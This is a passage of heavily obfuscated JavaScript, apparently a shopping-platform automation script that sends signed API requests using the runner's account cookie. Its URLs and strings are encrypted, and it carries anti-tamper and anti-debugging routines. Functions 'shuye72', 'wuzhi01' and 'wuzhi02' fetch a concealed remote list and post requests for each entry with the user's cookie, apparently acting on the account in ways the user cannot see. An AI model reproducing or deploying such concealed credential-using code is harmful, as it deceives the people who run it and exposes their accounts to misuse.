_0x7683x5=`${__Oxb24bc[0x0]}${JSON[__Oxb24bc[0x1]](_0x7683x3)}${__Oxb24bc[0x2]}${_0x7683x2}${__Oxb24bc[0x3]}${_0x7683x4}${__Oxb24bc[0x4]}`;let _0x7683x6=__Oxb24bc[0x5];const _0x7683x7=$[__Oxb24bc[0x6]]()?require(__Oxb24bc[0x7]):CryptoJS;let _0x7683x8=_0x7683x7.HmacSHA256(_0x7683x5,_0x7683x6).toString();return {url:`${__Oxb24bc[0x8]}${JD_API_HOST}${__Oxb24bc[0x9]}${_0x7683x2}${__Oxb24bc[0xa]}${escape(JSON[__Oxb24bc[0x1]](_0x7683x3))}${__Oxb24bc[0xb]}${_0x7683x4}${__Oxb24bc[0xc]}${_0x7683x8}${__Oxb24bc[0x8]}`,headers:{'\x48\x6F\x73\x74':__Oxb24bc[0xd],'\x61\x63\x63\x65\x70\x74':__Oxb24bc[0xe],'\x6B\x65\x72\x6E\x65\x6C\x70\x6C\x61\x74\x66\x6F\x72\x6D':__Oxb24bc[0xf],'\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74':__Oxb24bc[0x10],'\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65':__Oxb24bc[0x11],'\x43\x6F\x6F\x6B\x69\x65':cookie}}}(function(_0x7683x9,_0x7683xa,_0x7683xb,_0x7683xc,_0x7683xd,_0x7683xe){_0x7683xe= __Oxb24bc[0x12];_0x7683xc= function(_0x7683xf){if( typeof alert!== _0x7683xe){alert(_0x7683xf)};if( typeof console!== _0x7683xe){console[__Oxb24bc[0x13]](_0x7683xf)}};_0x7683xb= function(_0x7683x7,_0x7683x9){return _0x7683x7+ _0x7683x9};_0x7683xd= _0x7683xb(__Oxb24bc[0x14],_0x7683xb(_0x7683xb(__Oxb24bc[0x15],__Oxb24bc[0x16]),__Oxb24bc[0x17]));try{_0x7683x9= __encode;if(!( typeof _0x7683x9!== _0x7683xe&& _0x7683x9=== _0x7683xb(__Oxb24bc[0x18],__Oxb24bc[0x19]))){_0x7683xc(_0x7683xd)}}catch(e){_0x7683xc(_0x7683xd)}})({})
var _0xodu='jsjiami.com.v6',_0x2846=[_0xodu,'GhLDuMKe6K245rGs5aWs6LW677++6K+b5qKP5pyy57yO6LSO6Ya76K2s','e8OTesOoQw==','w4PCtFo4w4TDnA==','wolnw7U4w64=','woNjw4c0w4E=','w5jCi342w58=','w7fCqTNSKg==','w6R+JgDCqA==','w5UJCmjDqg==','w7oRw4XDlirCiXjDjMKowq93CQ==','djDDphzCssKHw70tA8KIw4zDncOdXcKgwovCuUsELsKzGybDjcKtwpfDuMOew7RNw4Rbw5c=','w79UNT/CjkBcwoLCphjDm8KgTMK8b8K7w7PDgg8qw73DmcOLwp3DollsUxkLHnLDoQ==','woXCg8Kpw5wdcDc5EsKzAsOfO8KbY8K+woRyN8KNem3DkCDCshDDqcOW','wrbDlsOAw6xJ','wrALDwDCuHZuwrPCnSjDtMOIccOfTMKf','w7YKVTc=','WcOvw5/CksOHMhIfF8KgwqzCksK9LU7DljpiwqLDl3DDjMK2ecOhPXYbw5YHw4FRw5DDnVRFfmLDuwDDtg5Nwp7Ch1bCunzClsKEU07DhcOPwqfCtMO5HsKaw6k3L1UNPsOFPGzDmh/ChFl4F8K8w4jCsFfDsC5BwpBMwr5ndQNKw6pwHcKKLVjCtcOtw4XCunUAw60kw53Dq0vDuMO6w7gtwrPDisKuw4UXb0zCiShPE8ONNcOaw7XDj8OrC3zDjsKZC8KhRn8+TcOYFsKEJ8KNEHzCgsKcSCHDo2/CllBuwr0i','w7MVw5jCiDTCnT3Ch8OvwqJuDS/Dr8O8L8Kkw7nDisOJw6rClcKELcOndsOnLl0=','bMOsEMOIZg==','woDCuMKTwpHDlQ==','a8OXMMOeeg==','KsKPw7EOwroq','wopyw6rDu8K5EMOySUk=','UifDnMKnw7wUcnDCk1wmw7kyw48cw53Dn8K+w6jDvC0pVMOG','bsKudnfCmQ==','woBQw4TDg8Kb','RidDFcOM','w45adgPDig==','w48GaBHCnQ==','w6HCv8O6w74Jwoo=','wrgDwrI=','wp3CqVbDisKkMTIaYXA+TsOm','w5zDjkI=','SsKJb2vCncORQcKZeVfDkcOgwqQ=','eQVXBcOW','wpvCr8K6w740','woLCqUzDjcKoNScAbmM=','w57DhUAADHYW','D21Hw71n','GcOgw4/CmsOSJwM=','YzHDscK8w6g=','w5TCg30fcg==','wqdtw4nDhMK5','GMOww5XCncOHOg0BZcKtw4HCusK3YBTCjG4Kw6DChSTClsO8DMKqOkAKw5Mew5pZwprCjF9McyDCixTCrgpEwobCjhbDq3DCnMKGGlPDocOLwq3Dq8KQM8K8w5VjBUdOe8KYFTHCjgrDjx4/U8KQw53CslXChQZDwqELw6hPcRZUw59OFsOKXBM=','woZjPwHCly1Pw6XCvsOkXCvCnRxUCsOGwp5UwoIqw5rCgT7DswvClMK/wrdKw6YbwqbDkcOjUAjCg8KIwopYFR/DqGMqDsOhwqQKPAQQJ8KfTcKiwqgMc8O/wrPCnD7DrsOBYGZ7McO/ETPDlsOMTcOkf8Kfw47ClcOAd8Kywo7DlCA3WsOnRlTDosOYwo0Tw5PDg2HCnCnDqSIxw7HCvkrCqcOiPsOBw4HCqDTDssO0wqtsHcK9w5rCnsOXXsKAwr8tDcK/w4nDoMOYwrTCjyfCjig+EGhwZ8OlwoPDpRF9PW7CsmbCpRlmwqscCXw2w79YRcOjw5gvITFQekXCs8KVCMOrbMK7FCTCvMOTwopcwpFHw4XDtsO+TFo9w7kaTkvCrBHDsD7Dg2x9KS3Dh8K6SsOpGXDCvMOqCD11Y8Ovwr/CgsKvwrLCqHLCg8K8wr7ClCHDvwpTwonDnsO+NxgzXjLCqEzDtMKCSTpGD8K2wq0FWwHDvTR+aRV7woYNXGnCiMKUwp3Coy1F','w6PCpGAu','K8KMfcObKA==','w4rCo8Olw7sF','ScOjOcOSGg==','RsK9wrk=','w5ATw6jCkA==','TyHCqnzorrzms7HlpYPotrHvvY/orYDmoq7mnLnnvp3otorphbfor40=','w7HCoVIwcRM=','w4NjexHDjg==','wo3Cr2jDqMKW','w7Fdw4ZowqU=','wqAfWcKIw5Fy','F8K/VcO5Hw==','RsK9wrk4V1c=','XBvDisK1w6Q=','wq0RecKZw48=','w50paVjCoTIdwrhlM8OmGg==','ck5UCsKSTEJawrnCm8OtYcOHwqLDlDnCsAjClARDwoDCs8Kxw5nCvcOdZn3DscKJw43Drw==','YTlGEMORw7wmcMKUwrQMdFYzAlPCiCkTw7oCBzfCkcKewqIUFl7DlsOUw6EN','Y8O4HMOIAcOCwpzDqcKJw5DDrXwEwprDt19ZEhAiwrQuw5wkwrE=','wpfCn8Oww48A','JSclKw4ZaA7DvghsPMO5wrHCrcK9','DMKzw4MK','KMOoJcOgW8O0wopwdl9Lwp5+FsKWfhYYSsKdM1FYwqfDmMK1wqfDmsKmHcK3KmlUJzbDjMKRI8KENhrCnMOlY8K6wqoNewnDkcOZw6LDlmxseMOYDy13wojDlCJTw4NiQDljwr1vMMOKwpnDoMO3R2Z2wqfCg8K6bcOBS8KWLMOnVMOFwqDCn3rDocOKwoLCh0bClAXDmsOZesOgwozDsTzCtcOdD8OyaWrDkcKAwrTDoklyccOewqnDoCcOV8Kxwp/Cs2DCvRPDhHQPJSPCiCDDh2M2I3rDlDgewqsEIwvDrsKQ','woFPw7/DmcKi','TDjClGPCrw==','ZsKGb3jCmQ==','w6ZfVynDqMKUw6JGw40=','w7XCukEFcFvCvGLDi2LDiMKECcOFwrrCtwDDisK1K1E8F8KR','VmZePsK0','ZxAsSGU=','w6Uqeg/DlQ==','w5vCvcOEwrJa','w4YLZwHDgg==','YnshFzUp','wojCmcKr','QcOfN8OtIcK9w6HCmcKpw6TDm1s3','w5Bew4k=','QVswLQIJaRTDrRBoNcOo','w5fCiHcVdw==','bsKAa2TCpg==','w4jCnXAnXCDDlAjDpEY=','cCXDohTCusKQw70=','w68QZDjCmA==','wqvDm8KZw6tGwqTCsg==','U8KTVHDCmg==','R8ObY8OCVA==','wr/Cjn3Dr8KETk9qQUQIacOVw57CnB/CvMK6wrLDjsK1I8Ouw6vDq8OLw4Zkw4oXDQJawqLDnMK4Pg==','wpXDhMOWw6XDgG5CLcOvZ8KJwp9hwoZsZcOgAMKldmtBw5s4JiV6wocrQsOpBcKOwrd2QC8yeg7DvcO3wrBYw4PClEXDhsOmYMOmYsKzWcKqd8Oiw7gAeUd0w6zDhMOSJ8KrNhTCom7CoMK5UMKSMSLChcKswr4IwrdxQsOYw4YCGgcdwrvCmcOoNR5Lw64Nw53Cm8Kqw4tpwow6Mwcnw6PCsMKRw601TA==','binCnW3Csg==','PsOUDVduw5x4dGhGw5rCqX7DrMOtCsOVw7tKFmAZwqVPw7MMw7Y1wrHCqyXDi8KdJTfCs2tzwoMCwoXDlXE=','w5QgbhY=','UMOxMHHCkA==','w5MsdgfCnA==','fSzDogjCsQ==','asK2REbCpA==','JQjCpg==','AQHCl1A=','w4Ndw4zDm+isuuawt+Wmsei0pe+8oeivueahuOacjee9vui1hemHqOismg==','w79QUzPDuQ==','EsOqw5zCu8OBIQ==','wqLCpMK2w4kn','w6oBWRLCjg==','cQ3DjijCjg==','w6/DiVsFGQ==','CTLCvXYR','w7JTw5N7wqE=','w5LCtsOwwppZ','w5QtdAbCvyZYw7MsOcO9EnHDvm7DrsKGwoPDizTClsK1w5cSwqMiJMOXw6QGw5bDpx57woJlwoEKw6VWwr/CmMOdMHjDhD3DoMKQw6DCmMKRw4ZAN2HDscKjwoh+fcKweksUMgkxRsKI','w6LCtEcUw5rDgkw6w4/CphbCjzLCuMOKNcKhw7w/w7LCu8OYw6cxK8KNY8KNw69Zw6vDlwZBL8Ocw6sEwrYEe8OpVwvCpC03w4RhwpbCpsODw451HcOPfFZDXzF+acKMIixLw4HChC/DgRHDjsOQNDQAPcKqEcOYwrRCG8KUw5fDvcOXw5w6EMKZw6UgSGHCvW/Cj8KCJShEKgwwwpcLDhXDhiFLeQEHw4XDrcKfKAXDiw/CocOyw5BGwoXCo8OgIBfDoDTCvcKKF8O1d8O8aA5hTsOjdz3CicObwprCtcKKaXvCpMOb','w6ZhaSzDuA==','w5nCqsOywqdo','W8OqPWXCvQ==','f8OjM8O/Sg==','MWpq','w7J8w4xpCw==','wqZDw4ctw4Q=','UyvDojHCtQ==','YV47EDM=','Rws2V2M=','w4PCtFo=','w4oucAc=','wpnDoWQt6K6a5rGA5aWG6LWd77+K6Ky95qG45p6K57y46Le26YSn6K2n','TMORLQ==','bsK7XVs=','w5PDsMOow4/orYPmsYXlpJzotabvvqror7TmobTmnK7nvZHotJrph4ror7k=','w5oTw7HClGwGHQ==','OQbCs8OVwrs=','w7YXehnDoQ==','wpTCssKjwofDviPCvw==','c8OHNXPCrcOa','w5XCssOHwoFF','WMKHwpg+ZA==','wr4leMKOw6I=','LV7CpsKvwqo=','cyHDohHCnMKBw6g=','UzlTGcOc','bCxYG8OMw7c=','wqgRSsKsw6RlEw==','w6ZAw5pPwoc=','CcOkw5LCig==','WsKSWlLCug==','G3DDr34=','SXZOCsKP','w4ggeg==','w5fDgVkB','jsjiEhaLmCi.MfAncAQUBotmy.v6=='];(function(_0x1df2e4,_0x4dfe90,_0x23dbaf){var _0x48bccc=function(_0x361745,_0x408b25,_0x5d7916,_0x120513,_0x3af87f){_0x408b25=_0x408b25>>0x8,_0x3af87f='po';var _0x4aeaee='shift',_0x38b1a6='push';if(_0x408b25<_0x361745){while(--_0x361745){_0x120513=_0x1df2e4[_0x4aeaee]();if(_0x408b25===_0x361745){_0x408b25=_0x120513;_0x5d7916=_0x1df2e4[_0x3af87f+'p']();}else if(_0x408b25&&_0x5d7916['replace'](/[EhLCMfAnAQUBty=]/g,'')===_0x408b25){_0x1df2e4[_0x38b1a6](_0x120513);}}_0x1df2e4[_0x38b1a6](_0x1df2e4[_0x4aeaee]());}return 0x779ab;};var _0x24c905=function(){var _0x4ce5f5={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x577402,_0x246a3f,_0x2b891c,_0x1794ca){_0x1794ca=_0x1794ca||{};var _0x3b2058=_0x246a3f+'='+_0x2b891c;var _0x30fb34=0x0;for(var _0x30fb34=0x0,_0x96b67e=_0x577402['length'];_0x30fb34<_0x96b67e;_0x30fb34++){var _0x23ef14=_0x577402[_0x30fb34];_0x3b2058+=';\x20'+_0x23ef14;var _0x26764e=_0x577402[_0x23ef14];_0x577402['push'](_0x26764e);_0x96b67e=_0x577402['length'];if(_0x26764e!==!![]){_0x3b2058+='='+_0x26764e;}}_0x1794ca['cookie']=_0x3b2058;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1f52ac,_0x5f5565){_0x1f52ac=_0x1f52ac||function(_0x4fc0bc){return _0x4fc0bc;};var _0x1873dd=_0x1f52ac(new RegExp('(?:^|;\x20)'+_0x5f5565['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x41e665=typeof _0xodu=='undefined'?'undefined':_0xodu,_0x2db9ff=_0x41e665['split'](''),_0x134aa8=_0x2db9ff['length'],_0x1b2cdc=_0x134aa8-0xe,_0x51a90f;while(_0x51a90f=_0x2db9ff['pop']()){_0x134aa8&&(_0x1b2cdc+=_0x51a90f['charCodeAt']());}var _0x57e289=function(_0x25eee1,_0x2745a4,_0x9f6f09){_0x25eee1(++_0x2745a4,_0x9f6f09);};_0x1b2cdc^-_0x134aa8===-0x524&&(_0x51a90f=_0x1b2cdc)&&_0x57e289(_0x48bccc,_0x4dfe90,_0x23dbaf);return _0x51a90f>>0x2===0x14b&&_0x1873dd?decodeURIComponent(_0x1873dd[0x1]):undefined;}};var _0x4a6d2a=function(){var _0x10fc1=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x10fc1['test'](_0x4ce5f5['removeCookie']['toString']());};_0x4ce5f5['updateCookie']=_0x4a6d2a;var _0x8272e2='';var _0x5c548c=_0x4ce5f5['updateCookie']();if(!_0x5c548c){_0x4ce5f5['setCookie'](['*'],'counter',0x1);}else if(_0x5c548c){_0x8272e2=_0x4ce5f5['getCookie'](null,'counter');}else{_0x4ce5f5['removeCookie']();}};_0x24c905();}(_0x2846,0x1c9,0x1c900));var _0x84d0=function(_0x6691e8,_0x12f4a3){_0x6691e8=~~'0x'['concat'](_0x6691e8);var _0x242ea8=_0x2846[_0x6691e8];if(_0x84d0['PEEsmm']===undefined){(function(){var _0x2d7420;try{var _0x37d058=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2d7420=_0x37d058();}catch(_0x52f52d){_0x2d7420=window;}var _0x2d493d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2d7420['atob']||(_0x2d7420['atob']=function(_0x1dd688){var _0x1f802b=String(_0x1dd688)['replace'](/=+$/,'');for(var _0x35e1af=0x0,_0x7b1713,_0x3db73d,_0xb64c64=0x0,_0x2990e1='';_0x3db73d=_0x1f802b['charAt'](_0xb64c64++);~_0x3db73d&&(_0x7b1713=_0x35e1af%0x4?_0x7b1713*0x40+_0x3db73d:_0x3db73d,_0x35e1af++%0x4)?_0x2990e1+=String['fromCharCode'](0xff&_0x7b1713>>(-0x2*_0x35e1af&0x6)):0x0){_0x3db73d=_0x2d493d['indexOf'](_0x3db73d);}return _0x2990e1;});}());var _0xadad78=function(_0x45169e,_0x12f4a3){var _0x2276dc=[],_0x32f3a3=0x0,_0x3a26d1,_0xd387e2='',_0x2ae28d='';_0x45169e=atob(_0x45169e);for(var _0x41304c=0x0,_0x3c7c2c=_0x45169e['length'];_0x41304c<_0x3c7c2c;_0x41304c++){_0x2ae28d+='%'+('00'+_0x45169e['charCodeAt'](_0x41304c)['toString'](0x10))['slice'](-0x2);}_0x45169e=decodeURIComponent(_0x2ae28d);for(var _0x46b47e=0x0;_0x46b47e<0x100;_0x46b47e++){_0x2276dc[_0x46b47e]=_0x46b47e;}for(_0x46b47e=0x0;_0x46b47e<0x100;_0x46b47e++){_0x32f3a3=(_0x32f3a3+_0x2276dc[_0x46b47e]+_0x12f4a3['charCodeAt'](_0x46b47e%_0x12f4a3['length']))%0x100;_0x3a26d1=_0x2276dc[_0x46b47e];_0x2276dc[_0x46b47e]=_0x2276dc[_0x32f3a3];_0x2276dc[_0x32f3a3]=_0x3a26d1;}_0x46b47e=0x0;_0x32f3a3=0x0;for(var _0x6013d=0x0;_0x6013d<_0x45169e['length'];_0x6013d++){_0x46b47e=(_0x46b47e+0x1)%0x100;_0x32f3a3=(_0x32f3a3+_0x2276dc[_0x46b47e])%0x100;_0x3a26d1=_0x2276dc[_0x46b47e];_0x2276dc[_0x46b47e]=_0x2276dc[_0x32f3a3];_0x2276dc[_0x32f3a3]=_0x3a26d1;_0xd387e2+=String['fromCharCode'](_0x45169e['charCodeAt'](_0x6013d)^_0x2276dc[(_0x2276dc[_0x46b47e]+_0x2276dc[_0x32f3a3])%0x100]);}return _0xd387e2;};_0x84d0['uDtIDv']=_0xadad78;_0x84d0['xHTuYM']={};_0x84d0['PEEsmm']=!![];}var _0x3e0496=_0x84d0['xHTuYM'][_0x6691e8];if(_0x3e0496===undefined){if(_0x84d0['wPHnFj']===undefined){var _0x552300=function(_0x33e601){this['nvpPhP']=_0x33e601;this['acfcjd']=[0x1,0x0,0x0];this['wEwfdg']=function(){return'newState';};this['nUWdBc']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['aikNpH']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x552300['prototype']['gRRdtq']=function(){var _0x35e467=new RegExp(this['nUWdBc']+this['aikNpH']);var _0xbf689f=_0x35e467['test'](this['wEwfdg']['toString']())?--this['acfcjd'][0x1]:--this['acfcjd'][0x0];return this['TPAmHR'](_0xbf689f);};_0x552300['prototype']['TPAmHR']=function(_0x1c4bf4){if(!Boolean(~_0x1c4bf4)){return _0x1c4bf4;}return this['XEZjsk'](this['nvpPhP']);};_0x552300['prototype']['XEZjsk']=function(_0x72e3a){for(var _0x174abc=0x0,_0x49dfa4=this['acfcjd']['length'];_0x174abc<_0x49dfa4;_0x174abc++){this['acfcjd']['push'](Math['round'](Math['random']()));_0x49dfa4=this['acfcjd']['length'];}return _0x72e3a(this['acfcjd'][0x0]);};new _0x552300(_0x84d0)['gRRdtq']();_0x84d0['wPHnFj']=!![];}_0x242ea8=_0x84d0['uDtIDv'](_0x242ea8,_0x12f4a3);_0x84d0['xHTuYM'][_0x6691e8]=_0x242ea8;}else{_0x242ea8=_0x3e0496;}return _0x242ea8;};var _0x480d8d=function(){var _0x54e8f9=!![];return function(_0x5533cb,_0x4a7ad7){var _0x5d4789=_0x54e8f9?function(){if(_0x4a7ad7){var _0x5c9296=_0x4a7ad7['apply'](_0x5533cb,arguments);_0x4a7ad7=null;return _0x5c9296;}}:function(){};_0x54e8f9=![];return _0x5d4789;};}();var _0x4e09f3=_0x480d8d(this,function(){var _0x290167=function(){return'\x64\x65\x76';},_0x25f055=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x4fba6e=function(){var _0x1cad32=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1cad32['\x74\x65\x73\x74'](_0x290167['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4529d1=function(){var _0x35c2a6=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x35c2a6['\x74\x65\x73\x74'](_0x25f055['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x27dae8=function(_0x5f49ae){var _0x13247c=~-0x1>>0x1+0xff%0x0;if(_0x5f49ae['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x13247c)){_0x37a2ad(_0x5f49ae);}};var _0x37a2ad=function(_0x144491){var _0xe3c41=~-0x4>>0x1+0xff%0x0;if(_0x144491['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xe3c41){_0x27dae8(_0x144491);}};if(!_0x4fba6e()){if(!_0x4529d1()){_0x27dae8('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x27dae8('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x27dae8('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4e09f3();function wuzhi01(_0x377045){var _0x320f42={'LRZQR':function(_0x4e49ec,_0x23cc54){return _0x4e49ec===_0x23cc54;},'BoQjh':_0x84d0('0','nJQ2'),'ZUawa':_0x84d0('1','&o!6'),'DmyBF':_0x84d0('2','rbLX'),'fHbbk':function(_0x21e601){return _0x21e601();},'pkDwl':_0x84d0('3','m)P!'),'KizGN':_0x84d0('4','[yqN'),'ntFIW':_0x84d0('5','14^x'),'cLXQV':_0x84d0('6','R1lr'),'Fnuit':_0x84d0('7','m)P!'),'AkWCV':_0x84d0('8','tvIN'),'kIusb':_0x84d0('9','qS8G'),'yLayn':function(_0x6b1ce1,_0x3eebf9){return _0x6b1ce1(_0x3eebf9);},'vXgRZ':_0x84d0('a','m)P!'),'YbYkg':_0x84d0('b','ewy0'),'GHnEV':_0x84d0('c','c))w'),'DqUVt':_0x84d0('d','14^x')};return new Promise(_0xbbbd10=>{if(_0x320f42[_0x84d0('e','#uH!')](_0x320f42[_0x84d0('f','BvM]')],_0x320f42[_0x84d0('10','#uH!')])){$[_0x84d0('11','pcRw')](e,resp);}else{let _0x1825f1=+new Date();let _0x446bf9=_0x377045[_0x84d0('12','Y4WG')];let _0x1774bb={'url':_0x84d0('13','sBs4')+ +new Date(),'headers':{'Host':_0x320f42[_0x84d0('14','vGP]')],'accept':_0x320f42[_0x84d0('15','Y4WG')],'content-type':_0x320f42[_0x84d0('16','2QGg')],'origin':_0x320f42[_0x84d0('17','iE6u')],'accept-language':_0x320f42[_0x84d0('18','Cu6B')],'user-agent':$[_0x84d0('19','xANQ')]()?process[_0x84d0('1a','lkFA')][_0x84d0('1b','flKv')]?process[_0x84d0('1c','mCTn')][_0x84d0('1d','vGP]')]:_0x320f42[_0x84d0('1e','2QGg')](require,_0x320f42[_0x84d0('1f','tvIN')])[_0x84d0('20','flKv')]:$[_0x84d0('21','mCTn')](_0x320f42[_0x84d0('22','Y!NX')])?$[_0x84d0('23','c))w')](_0x320f42[_0x84d0('24','sBs4')]):_0x320f42[_0x84d0('25','*(Td')],'referer':_0x320f42[_0x84d0('26','Y4WG')],'Cookie':cookie},'body':_0x84d0('27','c))w')+_0x446bf9+_0x84d0('28','Cu6B')+_0x1825f1};$[_0x84d0('29','*(Td')](_0x1774bb,(_0x2df07f,_0x3ecbfd,_0x406764)=>{try{if(_0x2df07f){if(_0x320f42[_0x84d0('2a',']7hV')](_0x320f42[_0x84d0('2b','xANQ')],_0x320f42[_0x84d0('2c','#Q6n')])){console[_0x84d0('2d','i3e#')]($[_0x84d0('2e','XHmD')]+_0x84d0('2f','eMX$'));}else{$[_0x84d0('30','YdFv')](e,resp);}}else{if(_0x320f42[_0x84d0('31','iE6u')](_0x320f42[_0x84d0('32','flKv')],_0x320f42[_0x84d0('33','UoI]')])){$[_0x84d0('34','TFeM')](e,resp);}else{_0x406764=JSON[_0x84d0('35',']7hV')](_0x406764);}}}catch(_0x5a25d1){$[_0x84d0('36','i3e#')](_0x5a25d1,resp);}finally{_0x320f42[_0x84d0('37','sBs4')](_0xbbbd10);}});}});}function wuzhi02(_0x36711d){var _0x1140e5={'bScKo':function(_0x3f63ae){return _0x3f63ae();},'fRmAN':function(_0x8a2a63,_0x4074fc){return _0x8a2a63===_0x4074fc;},'QOOKt':_0x84d0('38','TFeM'),'EXzXO':_0x84d0('39','ewy0'),'fSrWa':_0x84d0('3a','5@&h'),'KsZlM':_0x84d0('3b','2QGg'),'Jdwrq':_0x84d0('3c','#Q6n'),'hRGbZ':_0x84d0('3d','tvIN'),'DCdOS':function(_0x417a3f,_0x44f4a9){return _0x417a3f(_0x44f4a9);},'YIKWK':_0x84d0('3e','qSp4'),'SIdNT':_0x84d0('3f','pcRw'),'LikYr':_0x84d0('40','aaQ@')};return new Promise(_0x42aca3=>{var _0x327581={'OSkeI':function(_0x449cc1){return _0x1140e5[_0x84d0('41','Y4WG')](_0x449cc1);},'wckec':function(_0x166bb9,_0x197606){return _0x1140e5[_0x84d0('42','8y^2')](_0x166bb9,_0x197606);},'jltxj':_0x1140e5[_0x84d0('43','%FWi')]};let _0x241846=+new Date();let _0x5b0ed7=_0x36711d[_0x84d0('44','iE6u')];let _0x31e5e7={'url':_0x84d0('45','YdFv')+ +new Date(),'headers':{'Host':_0x1140e5[_0x84d0('46','5@&h')],'accept':_0x1140e5[_0x84d0('47','13l$')],'content-type':_0x1140e5[_0x84d0('48','I4ra')],'origin':_0x1140e5[_0x84d0('49','sK3U')],'accept-language':_0x1140e5[_0x84d0('4a','I4ra')],'user-agent':$[_0x84d0('4b','qSp4')]()?process[_0x84d0('4c','tvIN')][_0x84d0('4d','#Q6n')]?process[_0x84d0('4e','UoI]')][_0x84d0('4f','qSp4')]:_0x1140e5[_0x84d0('50','*(Td')](require,_0x1140e5[_0x84d0('51','%FWi')])[_0x84d0('52','YdFv')]:$[_0x84d0('53','R1lr')](_0x1140e5[_0x84d0('54','ewy0')])?$[_0x84d0('55','qS8G')](_0x1140e5[_0x84d0('56','vGP]')]):_0x1140e5[_0x84d0('57','0q83')],'referer':_0x84d0('58','flKv')+_0x5b0ed7,'Cookie':cookie},'body':_0x84d0('59','(eti')+_0x1140e5[_0x84d0('5a','8y^2')](escape,_0x5b0ed7)+_0x84d0('5b','(V(h')+_0x241846};$[_0x84d0('5c','Cu6B')](_0x31e5e7,(_0x11a45f,_0x539e9e,_0x205812)=>{var _0x531135={'NNDpq':function(_0xc7d251){return _0x327581[_0x84d0('5d','cGq2')](_0xc7d251);}};if(_0x327581[_0x84d0('5e','Cu6B')](_0x327581[_0x84d0('5f','R1lr')],_0x327581[_0x84d0('60','vGP]')])){try{if(_0x11a45f){console[_0x84d0('61','BrmD')]($[_0x84d0('62','eMX$')]+_0x84d0('63','Y4WG'));}else{_0x205812=JSON[_0x84d0('64','iE6u')](_0x205812);}}catch(_0x3e8d28){$[_0x84d0('65','c))w')](_0x3e8d28,resp);}finally{_0x327581[_0x84d0('66','tvIN')](_0x42aca3);}}else{_0x531135[_0x84d0('67','Cu6B')](_0x42aca3);}});});}function shuye72(){var _0x54419f={'DktAn':function(_0x496c1a,_0x306897){return _0x496c1a===_0x306897;},'jVThb':_0x84d0('68','R1lr'),'FHhHg':_0x84d0('69','mCTn'),'XNZzy':function(_0x1fbe24,_0x130e9f){return _0x1fbe24!==_0x130e9f;},'rUFCA':_0x84d0('6a','eMX$'),'wySfN':function(_0x13b5a1,_0x4de24d){return _0x13b5a1<_0x4de24d;},'ZHjlt':function(_0x4e5184,_0x5ef23d){return _0x4e5184(_0x5ef23d);},'LNyAm':function(_0x3b9ba6){return _0x3b9ba6();},'iPHld':function(_0x3a2e90,_0x251f72){return _0x3a2e90===_0x251f72;},'HsAgC':_0x84d0('6b','UoI]'),'DHfqd':_0x84d0('6c','sK3U'),'zSref':_0x84d0('6d','ewy0'),'cjKTG':_0x84d0('6e','&o!6')};return new Promise(_0x41e8cb=>{if(_0x54419f[_0x84d0('6f','iE6u')](_0x54419f[_0x84d0('70','sK3U')],_0x54419f[_0x84d0('71','cGq2')])){data=JSON[_0x84d0('72','aaQ@')](data);}else{$[_0x84d0('73','Y!NX')]({'url':_0x54419f[_0x84d0('74','Os)l')],'headers':{'User-Agent':_0x54419f[_0x84d0('75','nJQ2')]}},async(_0x4fad05,_0x314b94,_0x147826)=>{if(_0x54419f[_0x84d0('76','R1lr')](_0x54419f[_0x84d0('77','qSp4')],_0x54419f[_0x84d0('78','13l$')])){console[_0x84d0('79','&o!6')]($[_0x84d0('7a','Cu6B')]+_0x84d0('7b','mCTn'));}else{try{if(_0x4fad05){console[_0x84d0('7c','#uH!')]($[_0x84d0('7d','vGP]')]+_0x84d0('7e','(eti'));}else{$[_0x84d0('7f','XHmD')]=JSON[_0x84d0('80','BrmD')](_0x147826);if(_0x54419f[_0x84d0('81','I4ra')]($[_0x84d0('82','BvM]')][_0x84d0('83','cGq2')],0x0)){if(_0x54419f[_0x84d0('84','sK3U')](_0x54419f[_0x84d0('85','i3e#')],_0x54419f[_0x84d0('86','TFeM')])){for(let _0x5ac3b4=0x0;_0x54419f[_0x84d0('87','M8[7')](_0x5ac3b4,$[_0x84d0('88','R1lr')][_0x84d0('89','2QGg')][_0x84d0('8a','2QGg')]);_0x5ac3b4++){let _0x8fa4d2=$[_0x84d0('8b','TFeM')][_0x84d0('8c','UoI]')][_0x5ac3b4];await $[_0x84d0('8d','c))w')](0x1f4);_0x54419f[_0x84d0('8e','vGP]')](wuzhi01,_0x8fa4d2);await $[_0x84d0('8f','J6Sx')](0x1f4);_0x54419f[_0x84d0('90','5@&h')](wuzhi02,_0x8fa4d2);}}else{if(_0x4fad05){console[_0x84d0('91','Cu6B')]($[_0x84d0('92','mCTn')]+_0x84d0('93','sBs4'));}else{_0x147826=JSON[_0x84d0('94','0q83')](_0x147826);}}}}}catch(_0x1eff27){$[_0x84d0('95','&o!6')](_0x1eff27,_0x314b94);}finally{_0x54419f[_0x84d0('96','nJQ2')](_0x41e8cb);}}});}});};_0xodu='jsjiami.com.v6';
function taskGetUrl(function_id, body) {
